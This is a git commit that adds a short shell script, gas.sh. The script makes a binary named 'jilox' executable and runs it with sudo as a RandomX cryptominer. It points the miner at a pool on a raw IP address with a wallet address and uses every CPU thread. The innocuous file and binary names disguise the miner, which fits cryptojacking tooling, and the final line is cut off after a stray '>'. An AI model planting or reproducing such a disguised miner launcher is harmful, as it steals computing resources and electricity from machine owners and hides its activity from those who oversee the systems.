44f0f438003e89bd46acf056597a0a9a0abb9072
vinawinjena <143081460+vinawinjena@users.noreply.github.com>
2023-08-31 00:30:20 +0700

    Create gas.sh

---
+++ gas.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+chmod +x jilox
+sudo ./jilox -a rx/0 -o 172.104.176.128:80 -u ZEPHs9wbP2kgeHU9wJoPonUwJAsZkj5rHagMgnDjK7186LuNVVfFeCGDByX2Y18AvbdRJQsNK4Fu4QM7XGs1bXegNGhthDhZ5ht -p Tester -t $(nproc --all) --donate-level 1 -k >
